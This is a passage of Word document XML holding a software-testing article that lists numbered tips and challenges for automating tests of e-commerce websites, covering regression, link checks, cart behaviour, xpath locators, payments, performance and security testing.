            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Challenges Automating E-commerce Website</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1206" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1207" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>To remain on Safer Edge and deliver the desired results to the client you need to shift the focus on quality and performance of your E-commerce website while shrinking timeline as much as possible</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1208" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1209" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>In general Automation Testing starts by selecting right test automation framework which directly impacts on the result of the test automation project. The framework must include the test scripts and the scenarios of various automated processes.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1210" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1211" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">Based on the framework, the testers can easily execute the tests and obtain relevant results by generating test reports. But selecting right tool to automate E-commerce Website depends on many key parameters.  It is always important to compare the available tools based on key </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>parameters like features, performance, extensibility, licensing cost, maintenance cost, and Training and support.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1212" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1213" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>You must take </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://jackmartin6.wordpress.com/2015/12/02/a-look-into-the-future-of-test-automation-tools/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>advantage of many open source test automation tools</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> to automate more testing efforts without investing additional funds.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1214" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1215" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#1)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> E-commerce websites are much entangled in nature, automating each action is not possible because we cannot assume the nature of the customer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1216" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1217" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#2)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Continuous changes for e-commerce demands Regression so run regression test suit every day to keep track the effects of change.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1218" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1219" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#3)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Always</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> go with Automating Integration type of scenarios that should cover from selecting a link on home page till checkout and payment gateway page. Hereby, you can at least cover maximum user experience with E-commerce Website, so that adequate testing can be achieved by automating regression cycle.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1220" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1221" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#4)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Never</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> waste time automating on the unstable application. A simple change will affect your whole test suits and you have to recreate it.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1222" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1223" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#5)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Homepage of E-commerce Website is very important and contents </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>many</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> information and 1000 of links associated with each product and these links grow up every day as new offers or product is added to a page. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>So before proceeding to regression testing its best to verify every link in page by using HTTP status code.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1224" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1225" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#6)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>When</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> you are executing test scripts on a different browser at the same time. If a product is added to shopping cart or removed that information should be reflected in other browsers too.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1226" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1227" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#7)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>When</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> you running test parallel this will obviously fail your script in such scenario you have to periodically refresh your page to retain cart information. In real time you may come across this scenario such as a user may sometimes use mobile e-commerce app and also mobile e-commerce web application.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1228" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1229" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#8)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Don’t</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> neglect to verify each product details and pricing details whether it is 10 products or 1000 products it should be as per the seller requirement. This is the phase where you can make or break a customer slight mistake will lead to a big loss.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1230" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1231" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#9)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Create</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> yourself a lot of interrupted scenarios that usually user come across design your script very robust so that your script afford it and still run and pass the script.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1232" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1233" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>For Example,</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> you stored all the card information and clicked on submit due to low charge or network issue application stuck. In this case, a user is notified about his transaction status through email and message to phone you should validate this email or message in a test script.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1234" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1235" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>#10)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Web element of E-commerce website keeps changing so always </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Create</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> manual </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>xpath</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">. Some Web Elements attributes will be same so there will be no unique way of distinguishing in such scenario use </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>contains(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">) method of </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>xpaths</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> or scroll into view.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1236" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1237" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#11)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Automate </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/what-is-web-accessibility-testing/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Accessibility Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> by keyboard actions without using mouse action you definitely will come across some of the problems and fix it. This plays a significant role in user interface testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1238" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1239" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#12)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Tester should be carefully designed the scenario and add initiate checkpoint and insert login script whenever it is required.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1240" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1241" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#13)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Maintain different scripts for a different mode of payment to avoid confusion.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Check if what happens if an order is canceling after payment.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1242" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1243" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#14)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Performance testing in other hand plays a very crucial role. The factors you need to test here request per second, Transaction Per minute, Execution per click, a Response time of page load, duration of the task, Length of time between click and page display and DNS lookup.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1244" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1245" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#15)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Security Testing is where customer trust is gained on which e-commerce is built so here you have to spend a lot of time testing on DENIAL OF SERVICE ATTACK, User Account security, Data confidentiality, content security, credit card security, disable non-essential </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>services.SSL</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Certificate Validation.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1246" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1247" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>#16)</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> Automating</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>  Localization</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
